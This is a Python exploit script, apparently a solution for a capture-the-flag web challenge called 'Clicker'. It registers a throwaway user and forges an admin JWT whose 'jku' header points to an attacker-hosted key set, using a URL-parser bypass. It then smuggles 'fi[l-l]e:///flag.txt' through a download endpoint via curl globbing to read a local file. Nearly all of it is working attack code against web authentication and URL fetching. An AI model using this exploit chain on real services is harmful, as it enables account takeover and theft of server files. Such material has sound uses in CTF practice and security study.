import argparse
import os
import re
import json
import base64
from datetime import datetime, timedelta, timezone

import jwt
import requests

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend


DEFAULT_KID = 'my_malicious_key'


def _script_path(*parts: str) -> str:
    return os.path.join(os.path.dirname(__file__), *parts)


def load_private_key(key_path: str) -> bytes:
    with open(key_path, 'rb') as f:
        return f.read()


def _int_to_b64u(n: int) -> str:
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('utf-8')


def jwks_from_private_pem(private_pem: bytes, kid: str) -> dict:
    priv = serialization.load_pem_private_key(private_pem, password=None, backend=default_backend())
    pub = priv.public_key().public_numbers()
    return {
        'keys': [
            {
                'kty': 'RSA',
                'kid': kid,
                'use': 'sig',
                'alg': 'RS256',
                'n': _int_to_b64u(pub.n),
                'e': _int_to_b64u(pub.e),
            }
        ]
    }


def generate_rsa_keypair_pem() -> bytes:
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend(),
    )
    return private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )


def exploit(target_url: str, jwks_url: str, key_path: str, kid: str) -> str | None:
    s = requests.Session()
    
    # 1. Register
    username = 'hacker_' + os.urandom(4).hex()
    password = 'password123'
    print(f"[*] Registering user {username}...")
    r = s.post(f"{target_url}/api/register", json={"username": username, "password": password})
    if r.status_code != 201:
        print(f"[-] Registration failed: {r.text}")
        return

    # 2. Login
    print("[*] Logging in...")
    r = s.post(f"{target_url}/api/login", json={"username": username, "password": password})
    if r.status_code != 200:
        print(f"[-] Login failed: {r.text}")
        return
    
    # 3. Forge Token
    print("[*] Forging Admin Token...")
    private_pem = load_private_key(key_path)
    
    payload = {
        'user_id': 1,
        'username': 'admin',
        'is_admin': True,
        'exp': datetime.now(timezone.utc) + timedelta(hours=24),
        'jku': jwks_url
    }
    
    token = jwt.encode(payload, private_pem, algorithm='RS256', headers={'kid': kid})
    
    # 4. Access Admin
    headers = {'Authorization': f'Bearer {token}'}
    print("[*] Checking Admin Access...")
    r = s.get(f"{target_url}/api/admin/settings", headers=headers)
    if r.status_code == 200:
        print("[+] Admin Access Confirmed!")
    else:
        print(f"[-] Admin Access Failed: {r.status_code} {r.text}")
        if r.status_code in (401, 403):
            print("    Hint: the service must be able to fetch your JWKS. Ensure:")
            print("      - jwks_url is publicly reachable from the challenge container")
            print("      - response Content-Type is exactly application/json")
            print("      - final URL ends with jwks.json (no redirects)")
            print("      - JWKS content matches the private key you used to sign (same RSA modulus n)")
        return

    # 5. Retrieve Flag via /api/admin/download (Curl Globbing)
    print("[*] Exploiting Curl Globbing to read /flag.txt...")
    # Bypass blocked protocols using globbing: fi[l-l]e:///flag.txt -> file:///flag.txt
    malicious_url = "fi[l-l]e:///flag.txt"
    filename = "flag_leak.txt"
    
    data = {
        "url": malicious_url,
        "filename": filename,
        "title": "Flag",
        "type": "image" 
    }
    
    r = s.post(f"{target_url}/api/admin/download", json=data, headers=headers)
    
    if r.status_code == 200:
        print("[+] Download triggered successfully.")
        print(f"    Response: {r.json()}")
        
        # 6. Read the leaked file from static/
        print(f"[*] Fetching leaked flag from /static/{filename}...")
        r = s.get(f"{target_url}/static/{filename}")
        if r.status_code == 200:
            body = r.text.strip()
            print(f"[+] Response: {body}")
            m = re.search(r"C2C\{[^}]+\}", body)
            if m:
                print(f"[+] FLAG FOUND: {m.group(0)}")
                return m.group(0)
            return body
        else:
            print(f"[-] Failed to read flag file: {r.status_code}")
    else:
        print(f"[-] Download failed: {r.status_code} {r.text}")

    return None

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description='Clicker exploit (JKU parser bypass + curl globbing)')
    ap.add_argument('--target', help='Target base URL, e.g. http://challenges.1pc.tf:43855')
    ap.add_argument('--jwks-url', help='Public URL to attacker JWKS ending with jwks.json')
    ap.add_argument('--kid', default=DEFAULT_KID, help='JWK kid header value used when signing')
    ap.add_argument('--key', default=_script_path('malicious_key.pem'), help='Path to attacker RSA private key (PEM)')
    ap.add_argument('--jwks-out', default=_script_path('malicious_jwks.json'), help='Where to write JWKS JSON when generating keys')
    ap.add_argument('--gen-keys', action='store_true', help='Generate a fresh matching RSA private key + JWKS JSON, then exit')
    ap.add_argument('--print-jwks', action='store_true', help='Print JWKS JSON derived from --key (useful to copy to your server)')
    args = ap.parse_args()

    key_path = args.key

    if args.gen_keys:
        private_pem = generate_rsa_keypair_pem()
        os.makedirs(os.path.dirname(key_path), exist_ok=True)
        with open(key_path, 'wb') as f:
            f.write(private_pem)

        jwks = jwks_from_private_pem(private_pem, kid=args.kid)
        with open(args.jwks_out, 'w', encoding='utf-8') as f:
            json.dump(jwks, f, indent=2)

        print(f"[+] Wrote private key: {key_path}")
        print(f"[+] Wrote JWKS JSON: {args.jwks_out}")
        print("[+] Host the JWKS file at a PUBLIC URL that ends with jwks.json and returns Content-Type: application/json")
        raise SystemExit(0)

    if not os.path.exists(key_path):
        print(f"[-] Private key not found: {key_path}")
        print("    Generate one with: python clicker/exploit_clicker.py --gen-keys")
        raise SystemExit(2)

    private_pem = load_private_key(key_path)
    if args.print_jwks:
        jwks = jwks_from_private_pem(private_pem, kid=args.kid)
        print(json.dumps(jwks, indent=2))
        raise SystemExit(0)

    if not args.target or not args.jwks_url:
        print("[-] Missing --target/--jwks-url")
        print("    Example:")
        print("      python clicker/exploit_clicker.py --target http://challenges.1pc.tf:43855 --jwks-url http://user:pass@localhost@YOUR_HOST/jwks.json")
        raise SystemExit(2)

    target = args.target.rstrip('/')
    jwks_url = args.jwks_url

    exploit(target, jwks_url, key_path=key_path, kid=args.kid)
